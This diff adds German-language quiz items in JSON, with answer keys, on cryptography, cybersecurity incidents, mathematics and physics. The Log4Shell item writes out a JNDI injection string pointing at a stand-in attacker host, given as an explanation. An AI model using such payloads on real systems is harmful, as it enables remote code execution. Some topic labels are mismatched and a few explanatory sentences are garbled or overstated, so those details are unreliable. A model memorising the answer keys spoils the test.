+    "explanation": "Im NORAD-Komplex Cheyenne Mountain wurde das „Center for Y2K Strategic Stability“ eingerichtet. Offiziere der russischen Strategischen Raketentruppen arbeiteten zusammen mit US Space Command, um Frühwarnsysteme und Startcomputer über alle Zeitzonen hinweg zu beobachten – damit kein Y2K-Glitch als Angriff fehlinterpretiert wird.",
+    "realWorld": "Das Zentrum wurde am 2. Januar 2000 wieder geschlossen. Für eine Nacht ersetzte „Mutual Assured Destruction“ die „Mutual Assured Debugging“.",
+    "hint": "Kalte-Kriegs-Gegner saßen buchstäblich im selben Bunker, damit ein Datumsbug nicht die Zivilisation beendet."
+  },
+  {
+    "id": 50023,
+    "topic": "cryptography",
+    "difficulty": "hard",
+    "question": "Cicada 3301s Online-Rätsel nutzten Steganographie – das Verstecken von Daten in Bildern. Die häufigste Technik war:",
+    "options": [
+      "Daten in den Least Significant Bits (LSB) der Pixel-Farbwerte zu kodieren, sodass Änderungen unsichtbar bleiben, aber beliebige Binärdaten eingebettet werden können",
+      "Text in EXIF-Metadatenfeldern von JPEGs zu verstecken",
+      "unsichtbare Unicode-Zeichen zwischen sichtbaren Buchstaben zu verwenden",
+      "Morsecode in Kompressionsartefakten des Bildes zu verankern"
+    ],
+    "correctIndex": 0,
+    "explanation": "LSB-Steganographie verändert das niederwertigste Bit jedes Farbkanals (R, G, B) pro Pixel. Da das die Farbwerte nur um maximal 1/256 ändert, ist der Unterschied für Menschen praktisch unsichtbar. Ein 1920×1080-Bild kann so grob ~780 KB Daten verstecken.",
+    "realWorld": "Cicada 3301 nutzte OutGuess-Steganographie im initialen 4chan-Bild. Tools wie steghide und OutGuess sind Standard in CTF-Wettbewerben weltweit.",
+    "hint": "Das niedrigste Bit der Farbkanäle kann geändert werden, ohne dass man es sieht."
+  },
+  {
+    "id": 50024,
+    "topic": "cybersecurity",
+    "difficulty": "easy",
+    "question": "Der Y2K-Bug entstand durch eine scheinbar triviale Abkürzung beim Programmieren. Die Ursache war:",
+    "options": [
+      "Jahre als zwei Ziffern zu speichern (z. B. „99“ für 1999), um Speicher zu sparen – wodurch das Jahr 2000 als 1900 interpretiert werden konnte",
+      "hexadezimale Datums-Kodierung, die am Millenniumswechsel überlief",
+      "ein Off-by-One-Fehler in der Unix-Epoch-Timestamp-Berechnung",
+      "Sommerzeit-Konflikte zwischen US- und EU-Zeitzonen"
+    ],
+    "correctIndex": 0,
+    "explanation": "In den 1960er/70er Jahren war Speicher teuer (≈ 1 USD/Byte), also speicherte man nur die letzten zwei Ziffern des Jahres und sparte 2 Bytes pro Datum. Wenn „99“ zu „00“ wurde, interpretierten Systeme das als 1900, was Datumsvergleiche, Zinsberechnungen und Sortierung potenziell zerstören konnte.",
+    "realWorld": "Die weltweite Y2K-Sanierung kostete geschätzt 300–600 Mrd. USD. Dass am 1. Januar 2000 relativ wenig schiefging, zeigt eher, dass das Geld wirksam investiert war – nicht, dass die Gefahr übertrieben war.",
+    "hint": "Wenn ein Byte 1 USD kostet, sparen 2 Bytes pro Datum viel – bis der Kalender aufholt."
+  },
+  {
+    "id": 50025,
+    "topic": "cryptography",
+    "difficulty": "hard",
+    "question": "Herbert Yardleys „American Black Chamber“ verschaffte US-Unterhändlern 1921 auf der Washington Naval Conference einen entscheidenden Vorteil, indem sie:",
+    "options": [
+      "Japans interne Kabel las, die das minimale akzeptable Schlachtschiff-Verhältnis offenlegten, sodass die USA Japan zu schlechteren Bedingungen drängen konnten",
+      "gefälschte japanische Depeschen erstellte, um britische Verhandler zu täuschen",
+      "britische Flottenbefehle abfing und an Japan weitergab",
+      "falsche Informationen über US-Flottenstärke in abgefangene Kabel einschleuste"
+    ],
+    "correctIndex": 0,
+    "explanation": "Japans Instruktionen an die Delegation zeigten, dass Japan trotz öffentlicher Forderung 10:10:7 bereit war, ein Verhältnis von 10:10:6 (USA:UK:Japan) zu akzeptieren. Mit Kenntnis dieser Untergrenze setzten US-Verhandler das niedrigere Verhältnis durch – ein Lehrbuchbeispiel für SIGINT als Verhandlungsmacht.",
+    "realWorld": "Als Yardley diese Geheimnisse 1931 in einem Buch veröffentlichte, überarbeitete Japan sofort alle Codes – was zur deutlich schwierigeren Purple-Chiffre führte, die die USA dann jahrelang zu brechen versuchten.",
+    "hint": "Den Walk-away-Point des Gegners zu kennen, ist der ultimative Verhandlungsvorteil."
+  },
+  {
+    "id": 50026,
+    "topic": "cryptography",
+    "difficulty": "hard",
+    "question": "Im Babington-Komplott (1586) entschlüsselte Thomas Phelippes nicht nur Mary Stuartes Briefe – er:",
+    "options": [
+      "fälschte einen Nachsatz in Marys Chiffre, der die Verschwörer aufforderte, sich zu benennen, und machte Kryptoanalyse zu einer aktiven Entrapment-Operation",
+      "ersetzte verschlüsselte Nachrichten durch Desinformation, um die Plotter zu verwirren",
+      "veröffentlichte die entschlüsselten Briefe in Londoner Zeitungen, um die Öffentlichkeit zu beeinflussen",
+      "schickte Mary die entschlüsselten Informationen direkt, um sie zur Beichte einzuschüchtern"
+    ],
+    "correctIndex": 0,
+    "explanation": "Nach der Entschlüsselung von Marys Zustimmung zum Attentatsplan fügte Phelippes einen gefälschten Nachsatz in ihrer Chiffre hinzu und bat Babington um die Namen der Mitverschwörer. Babington lieferte eine vollständige Liste. Das gilt als frühes Beispiel offensiver Kryptoanalyse: nicht nur lesen, sondern manipulieren.",
+    "realWorld": "Die entschlüsselten und gefälschten Briefe wurden bei Marys Prozess verwendet. Sie wurde am 8. Februar 1587 enthauptet. Kryptoanalyse hatte ihr erstes „Kill“.",
+    "hint": "Warum nur die Post lesen, wenn man auch etwas hinzufügen kann?"
+  },
+  {
+    "id": 50027,
+    "topic": "cryptography",
+    "difficulty": "hard",
+    "question": "Das Grand Chiffre der Rossignol-Familie unter Ludwig XIV. widerstand 200 Jahre, weil es Zahlen ersetzte für:",
+    "options": [
+      "Silben statt einzelner Buchstaben, wodurch Häufigkeitsanalyse auf Einzelzeichen wirkungslos wurde",
+      "einzelne Buchstaben in einer einfachen 1:1-Abbildung",
+      "ganze Wörter mit einem festen Codebuch von 100 Einträgen",
+      "musikalische Noten, die anschließend als Zahlen transkribiert wurden"
+    ],
+    "correctIndex": 0,
+    "explanation": "Durch Kodierung von Silben statt Buchstaben hatte das Grand Chiffre ~587 Symbole für ein viel größeres Symbolalphabet. Häufigkeitsanalyse, die ungleiche Buchstabenverteilungen ausnutzt (E, T etc.), scheitert: Silbenfrequenzen sind gleichmäßiger, und das Mapping war zudem homophon (mehrere Zahlen pro Silbe).",
+    "realWorld": "Als Bazeries es 1893 knackte, stellte sich heraus, dass der Mann in der Eisernen Maske kein königlicher Zwilling war, sondern ein in Ungnade gefallener General – 200 Jahre romantischer Spekulation lösten sich auf.",
+    "hint": "Häufigkeitsanalyse zielt auf Buchstabenfrequenzen – aber was, wenn keine Buchstaben kodiert werden?"
+  },
+  {
+    "id": 50028,
+    "topic": "cryptography",
+    "difficulty": "sota",
+    "question": "Statistische Analysen des Voynich-Manuskripts zeigen, dass sein Text dem Zipfschen Gesetz folgt (Wortfrequenzverteilung). Das ist bedeutsam, weil:",
+    "options": [
+      "Zipfs Gesetz typisch für natürliche Sprache ist – zufälliger oder bedeutungsloser Text folgt ihm nicht; das spricht dafür, dass der Text echten sprachlichen Inhalt kodiert statt nur Kauderwelsch zu sein",
+      "Zipfs Gesetz beweist, dass der Text Latein in einfacher Substitution ist",
+      "nur computergenerierter Text Zipfs Gesetz folgt, was eine moderne Fälschung beweist",
+      "Zipfs Gesetz darauf hindeutet, dass es mathematische Notation und keine Sprache ist"
+    ],
+    "correctIndex": 0,
+    "explanation": "Zipfs Gesetz besagt: In natürlicher Sprache ist die Häufigkeit eines Wortes umgekehrt proportional zu seinem Rang. Voynich-Text folgt einer ähnlichen Verteilung mit Exponent (~1,0) wie bekannte Sprachen. Zudem passt seine Entropie (Informationsdichte pro Zeichen) eher zu Sprache als zu Zufallsstrings oder einfachen Chiffren.",
+    "realWorld": "Trotz sprachähnlicher Statistik wurde keine vorgeschlagene Entzifferung akademisch allgemein akzeptiert. Das Manuskript könnte eine konstruierte Sprache oder eine neuartige Chiffre verwenden.",
+    "hint": "Wenn Zufallstext Zipf nicht folgt, der Voynich-Text aber schon – was sagt das über Sinngehalt aus?"
+  },
+  {
+    "id": 50029,
+    "topic": "cybersecurity",
+    "difficulty": "sota",
+    "question": "Der SolarWinds-SUNBURST-Angriff war außergewöhnlich schwer zu entdecken, weil die Hintertür:",
+    "options": [
+      "in die Build-Pipeline eingeschleust wurde, sodass der Schadcode in digital signierte Updates kompiliert war und wie legitime Vendor-Software alle Integritätsprüfungen bestand",
+      "Quantenverschlüsselung nutzte, um die Kommunikation mit Command-Servern zu verbergen",
+      "nur aktiv wurde, wenn das infizierte System mit russischen IPs verbunden war",
+      "als Windows-Update getarnt war und nicht als SolarWinds-Update"
+    ],
+    "correctIndex": 0,
+    "explanation": "Durch Kompromittierung des Build-Systems (statt nur des Quellcode-Repos) stellten die Angreifer sicher, dass die Hintertür kompiliert und mit SolarWinds’ eigenem Code-Signing-Zertifikat signiert wurde. Sicherheitswerkzeuge, die Signaturen prüfen, akzeptierten das Update. Zusätzlich imitierte der Backdoor-Traffic legitime SolarWinds-Muster mit täuschend echten Domains.",
+    "realWorld": "Der Angriff blieb über 9 Monate unentdeckt. Entdeckt wurde er erst, als FireEye bemerkte, dass eigene Red-Team-Tools gestohlen wurden – die Angreifer wurden gierig.",
+    "hint": "Am meisten vertraut man Software, die der Hersteller selbst signiert und über offizielle Kanäle liefert."
+  },
+  {
+    "id": 50030,
+    "topic": "cybersecurity",
+    "difficulty": "sota",
+    "question": "NSO Groups Pegasus-Spyware erreichte „Zero-Click“-Exploits – die Kompromittierung von Smartphones ohne Nutzerinteraktion. Die Haupttechnik war:",
+    "options": [
+      "Memory-Corruption-Schwachstellen in Media-Parsern (z. B. iMessage-Bildrendering) auszunutzen, indem eine unsichtbare Nachricht gesendet wird, die beim automatischen Parsen Code ausführt",
+      "den Zielapparat anzurufen und eine Schwachstelle im Mobilfunk-Baseband auszunutzen",
+      "ein bösartiges App-Update über den offiziellen App Store zu verteilen",
+      "Social Engineering, um Opfer auf eine Website zu locken"
+    ],
+    "correctIndex": 0,
+    "explanation": "Zero-Click-Exploits zielen auf Code, der Daten automatisch verarbeitet – Bilddecoder, PDF-Renderer, Vorschau-Generatoren. iMessage pars(t) empfangene Inhalte automatisch; ein speziell präpariertes Bild konnte z. B. einen Buffer Overflow in Frameworks wie ImageIO auslösen und Remote Code Execution erreichen, bevor der Nutzer überhaupt eine Benachrichtigung sah.",
+    "realWorld": "Apples BlastDoor-Sandbox (iOS 14) wurde speziell gegen iMessage-Zero-Click-Angriffe gebaut. NSO umging sie. Apples Lockdown Mode (iOS 16) reduziert die Angriffsfläche weiter.",
+    "hint": "Die Schwachstelle sitzt in Code, der automatisch läuft, sobald Daten ankommen – bevor der Nutzer etwas anklickt."
+  },
+  {
+    "id": 50031,
+    "topic": "cybersecurity",
+    "difficulty": "hard",
+    "question": "Die Log4Shell-Schwachstelle (CVE-2021-44228) war trivial ausnutzbar, weil Log4js JNDI-Lookup-Funktion:",
+    "options": [
+      "Spezialsyntax wie ${jndi:ldap://attacker.com/x} in beliebigen geloggten Strings als Anweisung interpretierte, remote Java-Klassen von einem Angreifer-Server nachzuladen und auszuführen",
+      "alle Logdaten in eine öffentlich zugängliche Datei ohne Zugriffskontrollen schrieb",
+      "alle Logeinträge an einen zentralen Apache-Server sendete, der kompromittiert werden konnte",
+      "SQL-Injection über Log-Formatstrings erlaubte"
+    ],
+    "correctIndex": 0,
+    "explanation": "Log4j unterstützte JNDI-Lookups innerhalb von Lognachrichten. Traf es auf ${jndi:ldap://...}, verband es sich mit dem LDAP-Server und lud eine Java-Klasse. Da alles Mögliche geloggt wird – HTTP-Header, Formularfelder, Chat – wurde jede nutzerkontrollierte Zeichenkette zu einem Remote-Code-Execution-Vektor.",
+    "realWorld": "Minecraft-Spieler fanden heraus, dass sie Server crashen konnten, indem sie den Exploit-String in den Chat tippten. Die schnelle Reaktion der Community half, den Alarm früh auszulösen, bevor Unternehmenssysteme massenhaft kompromittiert wurden.",
+    "hint": "Eine Logging-Bibliothek, die User-Input als Code interpretiert, ist das Lehrbuchbeispiel für Injection."
+  },
+  {
+    "id": 50032,
+    "topic": "cybersecurity",
+    "difficulty": "sota",
+    "question": "Die Spectre-Schwachstelle nutzt spekulative Ausführung in CPUs aus. Das Grundproblem ist, dass:",
+    "options": [
+      "selbst wenn spekulative Ausführung nach einer Fehlvorhersage zurückgerollt wird, die während der Spekulation geladenen Daten im CPU-Cache bleiben und so einen messbaren Timing-Seitenkanal erzeugen",
+      "spekulative Ausführung Programmen erlaubt, direkt Kernel-Speicher über normale Load-Instruktionen auszulesen",
+      "der Branch Predictor von Malware so umprogrammiert werden kann, dass er immer falsch vorhersagt",
+      "spekulative Ausführung den Speicherschutz im Spekulationsfenster deaktiviert"
+    ],
+    "correctIndex": 0,
+    "explanation": "Wenn eine CPU spekulativ an einer Bounds-Check vorbei ausführt, die später scheitert, werden verbotene Daten in den Cache geladen. Registerzustände werden zurückgesetzt, der Cache aber nicht – sonst ginge der Performancegewinn verloren. Ein Angreifer kann per Cache-Timing (z. B. Flush+Reload) erkennen, welche Cache-Linien geladen wurden, und so Geheimnisse Bit für Bit ableiten.",
+    "realWorld": "Software-Fixes für Spectre kosten oft 5–30% Performance. Eine vollständige Hardware-Lösung erfordert grundlegende Änderungen an der Art, wie CPUs Spekulation handhaben – und würde ~20 Jahre Architekturoptimierung zurückdrehen.",
+    "hint": "Register werden nach Fehlvorhersage bereinigt, der Cache nicht – und Cache-Timing verrät Informationen."
+  },
+  {
+    "id": 50033,
+    "topic": "differential-equations",
+    "difficulty": "sota",
+    "question": "Die Black-Scholes-Gleichung nimmt an, dass Aktienkurse einer geometrischen Brownschen Bewegung folgen. Die entscheidende Einsicht für risikoneutrale Bewertung war:",
+    "options": [
+      "Ein kontinuierlich rebalanciertes „Delta-Hedge“-Portfolio eliminiert jedes Risiko, daher ist der Optionspreis unabhängig von Risikopräferenzen – der Drift-Term $\\mu$ fällt vollständig heraus",
+      "Aktienrenditen sind normalverteilt, daher sind Extremereignisse („Fat Tails“) vernachlässigbar",
+      "Optionen können nur am Verfallstag ausgeübt werden, daher ist vorzeitige Ausübung irrelevant",
+      "Zinsen sind stets konstant, daher liefern Anleihen eine perfekte Absicherung"
+    ],
+    "correctIndex": 0,
+    "explanation": "Durch Konstruktion eines Portfolios aus der Option und $-\\Delta$ Aktien (mit $\\Delta=\\partial V/\\partial S$) zeigten Black und Scholes, dass das Portfolio über infinitesimale Zeitintervalle risikolos ist. Risikolose Portfolios müssen den risikofreien Zinssatz verdienen – und die erwartete Aktienrendite $\\mu$ verschwindet aus der Gleichung.",
+    "realWorld": "LTCMs Kollaps 1998 und die Krise 2008 zeigten, dass die Annahme „kontinuierlich rebalanciert“ in illiquiden Märkten bricht – man kann nicht hedgen, wenn alle gleichzeitig verkaufen.",
+    "hint": "Wenn du eine Option perfekt absichern kannst, hängt ihr Preis nicht davon ab, wie risikofreudig Investoren sind."
+  },
+  {
+    "id": 50034,
+    "topic": "fluid-dynamics",
+    "difficulty": "sota",
+    "question": "Das Navier-Stokes-Problem (Existenz und Glattheit) fragt, ob Lösungen in 3D immer glatt bleiben. Terence Taos Resultat von 2016 deutete an, dass Blow-up möglich sein könnte, weil:",
+    "options": [
+      "er zeigte, dass eine gemittelte Version der Gleichungen Singularitäten in endlicher Zeit entwickeln kann, und kein bekannter Mechanismus verhindert, dass die vollen Gleichungen dasselbe tun",
+      "er bewies, dass Turbulenz immer zu unendlichen Geschwindigkeiten auf kleinen Skalen führt",
+      "er demonstrierte, dass 2D-Lösungen blow-up zeigen, also 3D erst recht",
+      "er fand eine konkrete Anfangsbedingung, die im vollen System unendlichen Druck erzeugt"
+    ],
+    "correctIndex": 0,
+    "explanation": "Tao konstruierte eine „Blaupause“ für Blow-up mit einer gemittelten Navier-Stokes-Variante, in der nichtlineare Wechselwirkungen durch ein vereinfachtes Modell ersetzt werden. Dieses gemittelte System entwickelt Singularitäten über eine selbstähnliche Kaskade. Das beweist keinen Blow-up für die echten Gleichungen, zeigt aber, dass die bekannten Struktureigenschaften nicht ausreichen, ihn auszuschließen.",
+    "realWorld": "Wenn Navier-Stokes blow-up zeigen kann, wären unsere fundamentalen Bewegungsgleichungen für Fluide unvollständig – jede Wetterprognose und Flugzeugsimulation beruht auf einer unbewiesenen Annahme.",
+    "hint": "Tao zeigte: Es gibt möglicherweise nicht genug „Struktur“, um Singularitäten zuverlässig zu verhindern."
+  },
+  {
+    "id": 50035,
+    "topic": "relativity",
+    "difficulty": "hard",
+    "question": "Das Frisch-Peierls-Memorandum (1940) schockierte die Alliierten, weil es berechnete, dass die kritische Masse von Uran-235 für eine Bombe etwa beträgt:",
+    "options": [
+      "ungefähr 1–10 kg (später auf ~15 kg für eine nackte Kugel verfeinert) – klein genug für ein Flugzeug, wodurch eine Bombe praktisch statt nur theoretisch wurde",
+      "mehrere Tonnen – zu schwer für jedes Trägersystem, daher unpraktikabel",
+      "genau 52 kg – passend zur Menge in bekannten Uranvorkommen",
+      "weniger als 1 Gramm – trivial mit Labormengen herzustellen"
+    ],
+    "correctIndex": 0,
+    "explanation": "Frühere Schätzungen gingen von Dutzenden Tonnen Natururan aus. Frisch und Peierls erkannten, dass reines U-235 (nicht Natururan, das zu 99,3% aus U-238 besteht) nur wenige Kilogramm kritische Masse hat. Das machte die Bombe zu einem Ingenieurproblem statt einer Kuriosität.",
+    "realWorld": "Das Memorandum initiierte direkt das britische MAUD Committee und letztlich das Manhattan Project. Die kritische Masse gilt weiterhin als „Restricted Data“ ohne Ablaufdatum.",
+    "hint": "Entscheidend war die Rechnung für reines U-235, nicht für Natururan – die Anreicherung änderte alles."
+  },
+  {
+    "id": 50036,
+    "topic": "information-theory",
+    "difficulty": "sota",
+    "question": "Shannons klassifizierter Bericht von 1945 bewies, dass perfekte Geheimhaltung in der Kryptographie erfordert:",
+    "options": [
+      "Der Schlüssel muss mindestens so lang wie die Nachricht sein, wirklich zufällig, niemals wiederverwendet und geheim – damit ist das One-Time Pad die einzige theoretisch unknackbare Chiffre",
+      "einen Schlüssel aus einem PRNG zu verwenden, der mit einem kurzen Passwort gesät wird",
+      "die Nachricht mehrfach mit verschiedenen kurzen Schlüsseln zu verschlüsseln",
+      "einen Schlüssel zu nutzen, der exakt halb so lang wie die Nachricht ist, kombiniert mit Fehlerkorrektur"
+    ],
+    "correctIndex": 0,
+    "explanation": "Shannon zeigte: Für perfekte Geheimhaltung ($H(M|C)=H(M)$, der Chiffretext verrät nichts über den Klartext) muss die Entropie des Schlüssels mindestens die Entropie der Nachricht erreichen. Also muss der Schlüssel mindestens so lang wie die Nachricht sein – das One-Time Pad. Jeder kürzere Schlüssel leakt Information.",
+    "realWorld": "Das sowjetische VENONA-Desaster bestätigt Shannons Satz per Gegenbeispiel: Wiederverwendung von OTP-Schlüsseln zerstörte die theoretische Unknackbarkeit.",
+    "hint": "Ist der Schlüssel kürzer als die Nachricht, wird zwangsläufig etwas Information über den Klartext preisgegeben."
+  },
+  {
+    "id": 50037,
+    "topic": "number-theory",
+    "difficulty": "hard",
+    "question": "Ramanujans Formel für $1/\\pi$ konvergiert extrem schnell, weil jedes zusätzliche Glied ungefähr hinzufügt:",
+    "options": [
+      "8 korrekte Dezimalstellen – eine der schnellsten bekannten Reihen für Pi, später genutzt, um Milliarden Stellen zu berechnen",
+      "1 korrekte Dezimalstelle – vergleichbar mit der Leibniz-Reihe",
+      "100 korrekte Dezimalstellen – schneller als jede andere bekannte Formel",
+      "2 korrekte Dezimalstellen – ähnlich wie Machins Formel"
+    ],
+    "correctIndex": 0,
+    "explanation": "Ramanujans Reihe $\\frac{1}{\\pi}=\\frac{2\\sqrt{2}}{9801}\\sum\\frac{(4k)!(1103+26390k)}{(k!)^4\\,396^{4k}}$ liefert etwa 8 Stellen pro Term, weil $396^4\\approx 10^{10{,}4}$. Die Chudnovsky-Variante (14 Stellen/Term) stellte mehrere Pi-Rekorde auf.",
+    "realWorld": "Ramanujan entwickelte diese Formel im kolonialen Indien mit kaum formaler Ausbildung. Wie er darauf kam, bleibt eines der großen Rätsel mathematischer Kreativität.",
+    "hint": "Die Konvergenz hängt von der Größe der Basis im Nenner ab – $396^4$ ist riesig."
+  },
+  {
+    "id": 50038,
+    "topic": "quantum-computing",
+    "difficulty": "hard",
+    "question": "Turings Beweis, dass das Halteproblem unentscheidbar ist, nutzt ein Diagonalargument. Der Widerspruch entsteht, wenn:",
+    "options": [
+      "ein Programm P konstruiert wird, das den hypothetischen Halte-Detektor H über sich selbst befragt und dann das Gegenteil tut – sagt H „P hält“, läuft P unendlich; sagt H „P läuft unendlich“, hält P",
+      "gezeigt wird, dass ein Programm unendlichen Speicher benötigt, um sein eigenes Verhalten zu bestimmen",
+      "zwei verschiedene Programme identische Ausgaben produzieren und daher nicht unterscheidbar sind",
+      "der Halte-Detektor vor einer Entscheidung die Zeit überschreitet"
+    ],
+    "correctIndex": 0,
+    "explanation": "Die selbstreferenzielle Konstruktion erzeugt ein Paradox: P(P) hält genau dann, wenn H sagt, dass P(P) nicht hält – und umgekehrt. Eine konsistente Antwort existiert nicht, also kann H nicht existieren. Strukturell ist das analog zu Cantors Diagonalargument und Gödel.",
+    "realWorld": "Das Halteproblem ist der Grund, warum kein Antivirus alle Malware erkennen kann, kein Compiler alle Endlosschleifen eliminieren kann und kein System seine eigene Korrektheit perfekt verifizieren kann.",
+    "hint": "Der Trick ist Selbstbezug: Das Programm fragt den Detektor über sich selbst und widerspricht absichtlich der Antwort."
+  },
+  {
+    "id": 50039,
+    "topic": "relativity",
+    "difficulty": "hard",
+    "question": "Noethers Theorem besagt: Jede kontinuierliche Symmetrie entspricht einer Erhaltungsgröße. Zeittranslationssymmetrie liefert konkret:",
+    "options": [
+      "Energieerhaltung – wenn sich die Naturgesetze mit der Zeit nicht ändern, bleibt die Gesamtenergie eines isolierten Systems konstant",
+      "Impulserhaltung – wenn sich die Gesetze nicht ändern, behalten Objekte konstante Geschwindigkeit",
+      "Ladungserhaltung – Zeitsymmetrie bedeutet, elektrische Ladung kann nicht erzeugt oder vernichtet werden",
+      "Drehimpulserhaltung – Zeitsymmetrie bedeutet, rotierende Objekte behalten ihre Rotation"
+    ],
+    "correctIndex": 0,
+    "explanation": "Noether ordnet Symmetrien Erhaltungsgrößen zu: Zeittranslation → Energie, Raumtranslation → Impuls, Rotation → Drehimpuls, Eichsymmetrie → Ladung. Die Zuordnung folgt aus der Invarianz der Lagrange-Funktion unter den jeweiligen Transformationen.",
+    "realWorld": "Noether bewies das, während ihr in Göttingen eine Professur verwehrt wurde, weil sie eine Frau war. Einstein nannte ihre Arbeit das „bedeutendste“ mathematische Genie der Ära.",
+    "hint": "Jede Symmetrie hat ihre Erhaltungsgröße – überlege, was „unverändert in der Zeit“ bewahren sollte."
+  },
+  {
+    "id": 50040,
+    "topic": "quantum-computing",
+    "difficulty": "sota",
+    "question": "Shors Algorithmus faktorisiert ganze Zahlen exponentiell schneller, indem er Quantenmechanik nutzt, um effizient zu finden:",
+    "options": [
+      "die Periode $r$ der modularen Exponentialfunktion $f(x)=a^x\\bmod N$, aus der dann Faktoren via $\\gcd(a^{r/2}\\pm 1, N)$ gewonnen werden",
+      "die Primfaktoren direkt durch Testen aller Teiler in Quanten-Superposition",
+      "den diskreten Logarithmus von $N$ zu einer Zufallsbasis, der die Faktorisierung verrät",
+      "Kollisionen in einer aus $N$ abgeleiteten Hashfunktion, die Faktorenbeziehungen offenlegen"
+    ],
+    "correctIndex": 0,
+    "explanation": "Klassische Computer finden die Periode von $a^x\\bmod N$ nicht effizient, aber ein Quantencomputer kann mit der Quanten-Fourier-Transformation die Periode aus einer Superposition vieler Werte extrahieren. Ist $r$ bekannt, werden Faktoren klassisch über $\\gcd(a^{r/2}\\pm 1, N)$ mit hoher Wahrscheinlichkeit gefunden.",
+    "realWorld": "Staaten sammeln heute verschlüsselte Daten, um sie später mit Quantencomputern zu entschlüsseln („harvest now, decrypt later“). Die Post-Quantum-Migration ist der größte kryptographische Umstieg der Geschichte.",
+    "hint": "Der Quantenvorteil kommt vom Finden von Periodizität – etwas, worin die Quanten-Fourier-Transformation stark ist."
+  }
+]
